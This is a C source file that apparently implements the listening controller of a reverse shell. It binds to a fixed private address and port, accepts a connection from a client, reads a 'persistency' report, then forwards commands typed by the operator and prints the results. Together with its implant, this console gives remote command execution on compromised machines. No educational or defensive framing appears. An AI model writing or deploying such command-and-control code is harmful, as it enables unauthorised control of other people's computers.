#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define server_ip "192.168.1.114"
#define server_port 50005

int main()
{
    int server_socket, client_socket;
    char buffer[1024];
    char response[18384];
    char persitency[80];
    struct sockaddr_in server_address, client_address;
    int i = 0;
    int opt_val = 1;
    socklen_t client_lenght;
    socklen_t server_lenght;

    server_socket = socket(AF_INET, SOCK_STREAM, 0);

    printf("#### Start Server on %s:%d ####\n", server_ip, server_port);

    if (setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR, &opt_val, sizeof(opt_val)) < 0)
    {
        printf("[-] Error setting TCP socket option\n");
        return 1;
    }

    server_address.sin_family = AF_INET;
    server_address.sin_addr.s_addr = inet_addr(server_ip);
    server_address.sin_port = htons(server_port);
    server_lenght = sizeof(server_address);

    bind(server_socket, (struct sockaddr *)&server_address, server_lenght); // binds the socket to the address and port number specified in addr

    listen_again:
    listen(server_socket, 5); // waits for the client to approach the server to make a connection
    printf("[*] Waiting for incoming connections \n");
    client_lenght = sizeof(client_address);

    client_socket = accept(server_socket, (struct sockaddr *)&client_address, &client_lenght); // At this point, connection is established between client and server, and they are ready to transfer data.
    printf("[+] Connection stablished with %s\n", inet_ntoa(client_address.sin_addr));
    
    memset(&persitency, 0, sizeof(persitency));
    recv(client_socket, persitency, sizeof(persitency), 0);
    printf("%s\n", persitency);
    
    while (1)
    {
        memset(&buffer, 0, sizeof(buffer));
        memset(&response, 0, sizeof(response));
        
        printf("%s:~$ ", inet_ntoa(client_address.sin_addr));

        fgets(buffer, sizeof(buffer), stdin);
        strtok(buffer, "\n");

        if (!strncmp("q", buffer, 1))
            break;

        write(client_socket, buffer, sizeof(buffer));
        recv(client_socket, response, sizeof(response), 0);
        printf("%s", response);
    }

}